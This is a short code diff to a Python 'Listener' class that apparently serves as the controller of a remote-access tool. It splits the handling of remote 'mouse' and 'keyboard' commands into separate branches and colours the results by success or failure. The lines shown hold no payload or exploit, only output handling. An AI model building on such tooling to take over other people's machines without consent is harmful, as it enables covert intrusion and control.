@@ -193,9 +193,19 @@ class Listener:
 				except: res = UkDecode(subprocess.check_output("dir", shell = True))
 				print(res)
 
-			elif command.strip() and len(command.split()) == 2 and command.split()[0] == "mouse" or command.split()[0] == "keyboard":
+			elif command.strip() and len(command.split()) == 2 and command.split()[0] == "mouse":
 				result = self.execute_remotely(command)
-				print(result)
+				if result.split()[0] == "[-]":
+					print(colored(result, "red"))
+				else:
+					print(colored(result, "green"))
+
+			elif command.strip() and len(command.split()) == 2 and command.split()[0] == "keyboard":
+				result = self.execute_remotely(command)
+				if result.split()[0] == "[-]":
+					print(colored(result, "red"))
+				else:
+					print(colored(result, "green"))
 
 
 			elif len(command.split()):
